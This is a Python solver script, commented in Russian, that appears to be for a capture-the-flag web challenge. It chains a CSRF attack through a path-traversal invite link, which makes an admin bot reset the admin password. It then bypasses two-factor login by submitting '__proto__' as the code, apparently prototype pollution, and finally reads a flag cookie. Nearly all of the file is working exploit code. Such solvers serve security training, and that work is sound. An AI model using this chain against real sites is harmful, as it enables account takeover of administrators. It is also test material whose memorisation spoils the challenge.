#!/usr/bin/env python3
"""Решение СоюзМультГиф: CSRF через /invite → смена пароля admin → обход 2FA через __proto__."""

from __future__ import annotations

import argparse
import http.cookiejar
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

NEW_PASSWORD = "hacked123"
PP_CODE = "__proto__"


def request_json(method: str, url: str, data=None, cookies=None, timeout=30):
    body = None
    headers = {}
    if data is not None:
        body = json.dumps(data).encode()
        headers["Content-Type"] = "application/json"
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookies or http.cookiejar.CookieJar()))
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with opener.open(req, timeout=timeout) as resp:
            raw = resp.read()
            payload = json.loads(raw.decode() or "{}") if raw else {}
            return resp.status, payload, resp.headers
    except urllib.error.HTTPError as exc:
        raw = exc.read()
        try:
            payload = json.loads(raw.decode() or "{}")
        except json.JSONDecodeError:
            payload = {"error": raw.decode(errors="replace")}
        return exc.code, payload, exc.headers


def invite_url(origin: str, password: str) -> str:
    cartoon_id = f"../../../../api/user/password?newPassword={password}&a=a"
    query = urllib.parse.urlencode({"action": "join", "cartoonId": cartoon_id, "token": "../"})
    return f"{origin.rstrip('/')}/invite?{query}"


def flag_from_headers(headers) -> str | None:
    values = headers.get_all("Set-Cookie") if hasattr(headers, "get_all") else []
    if not values:
        cookie = headers.get("Set-Cookie")
        values = [cookie] if cookie else []
    for item in values:
        match = re.search(r"\bflag=([^;]+)", item)
        if match:
            return urllib.parse.unquote(match.group(1))
    return None


def login_admin(target: str, password: str, cookies, attempts: int = 20):
    last = (None, None, None)
    for _ in range(attempts):
        last = request_json(
            "POST",
            f"{target.rstrip('/')}/api/login",
            {"login": "admin", "password": password},
            cookies=cookies,
        )
        status, payload, _ = last
        if status == 200 and payload.get("require2FA"):
            return last
        time.sleep(2)
    return last


def main() -> int:
    parser = argparse.ArgumentParser(description="Solver для СоюзМультГиф")
    parser.add_argument("--target", default="http://localhost:3000", help="URL фронтенда с хоста")
    parser.add_argument("--bot", default="http://localhost:8080", help="URL бота с хоста")
    parser.add_argument(
        "--frontend-internal",
        default="",
        help="URL фронтенда глазами бота (по умолчанию http://frontend для localhost)",
    )
    parser.add_argument("--password", default=NEW_PASSWORD, help="Новый пароль admin")
    args = parser.parse_args()

    target = args.target.rstrip("/")
    bot = args.bot.rstrip("/")
    if args.frontend_internal:
        internal = args.frontend_internal.rstrip("/")
    elif urllib.parse.urlparse(target).hostname in {"localhost", "127.0.0.1"}:
        internal = "http://frontend"
    else:
        internal = target

    csrf = invite_url(internal, args.password)
    print(f"[*] CSRF URL для бота: {csrf}")

    status, payload, _ = request_json("POST", f"{bot}/visit", {"url": csrf})
    if status != 200:
        print(f"[-] Бот не принял /visit: {status} {payload}", file=sys.stderr)
        return 1
    print("[*] Бот пошёл на invite, ждём логин и CSRF...")
    time.sleep(8)

    cookies = http.cookiejar.CookieJar()
    status, payload, _ = login_admin(target, args.password, cookies)
    if not (status == 200 and payload.get("require2FA")):
        print(
            f"[-] Пароль admin не сменился ({status} {payload}). "
            "Перезапусти стек и проверь логи бота.",
            file=sys.stderr,
        )
        return 1
    print("[+] Пароль admin изменён, обходим 2FA через __proto__")

    status, payload, headers = request_json(
        "POST",
        f"{target}/api/login/2fa",
        {"login": "admin", "code": PP_CODE},
        cookies=cookies,
    )
    if status != 200 or not payload.get("success"):
        print(f"[-] 2FA не прошла: {status} {payload}", file=sys.stderr)
        return 1

    flag = flag_from_headers(headers)
    if not flag:
        for cookie in cookies:
            if cookie.name == "flag":
                flag = cookie.value
                break
    if not flag:
        print("[-] 2FA ок, но cookie flag не найдена", file=sys.stderr)
        return 1

    print(f"[+] {flag}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
